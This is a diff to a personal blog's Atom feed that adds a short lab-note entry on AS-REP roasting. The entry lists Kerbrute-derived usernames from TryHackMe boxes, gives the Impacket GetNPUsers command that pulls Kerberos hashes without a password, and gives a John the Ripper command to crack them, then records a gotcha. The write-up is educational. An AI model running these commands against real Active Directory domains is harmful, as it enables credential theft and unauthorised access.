@@ -4,13 +4,82 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-03-05T19:10:44+08:00</updated>
+ <updated>2022-03-07T20:06:33+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>AS-REP Roasting using Impacket</title>
+   <link href="https://mvineza.github.io/spindel/2022/03/07/as-rep-roasting-using-impacket"/>
+   <updated>2022-03-07T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/03/07/AS-REP-Roasting-using-Impacket</id>
+   <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;With valid usernames, attacker can intercept NTLMv2 hash and crack it to get the password because pre-authentication phase is disabled&lt;/li&gt;
+  &lt;li&gt;One way of getting valid usernames is to use [[Kerbrute]] technique&lt;/li&gt;
+  &lt;li&gt;See [[AS-REP]] for theory behind this attack&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;steps&quot;&gt;Steps&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Add DC entry to hosts file&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;10.10.135.224 SPOOKYSEC.local
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Get a list of valid accounts using [[Kerbrute]]&lt;/li&gt;
+  &lt;li&gt;Put them into a txt file&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;svc-admin@spookysec.local
+James@spookysec.local
+robin@spookysec.local
+darkstar@spookysec.local
+administrator@spookysec.local
+backup@spookysec.local
+paradox@spookysec.local
+JAMES@spookysec.local
+Robin@spookysec.local
+Administrator@spookysec.local
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Run impacket to determine what accounts are AS-REP roastable&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py SPOOKYSEC.local/ -usersfile users.txt -format john -outputfile out.john -no-pass
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Here is an example output.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/AS-REP%20Roasting%20using%20Impacket/76430BF0-31FD-4DBF-A15F-81F0CFB51661.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Crack the hashes and enjoy!&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt out.john
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;gotchas&quot;&gt;Gotchas&lt;/h2&gt;
+&lt;p&gt;I encounter an issue on THM ra box. Output tells that user doesn’t require preauth set.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[-] User buse@windcorp.thm doesn't have UF_DONT_REQUIRE_PREAUTH set
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;But then there was no hashes dumped. When I checked the connections in wireshark, I see that its requiring pre auth!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/AS-REP%20Roasting%20using%20Impacket/A89116D4-A26E-46F4-9C17-44EF3E91FA4D.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</content>
+ </entry>
  
  <entry>
    <title>PD4ML Attachment from DynamoDB</title>
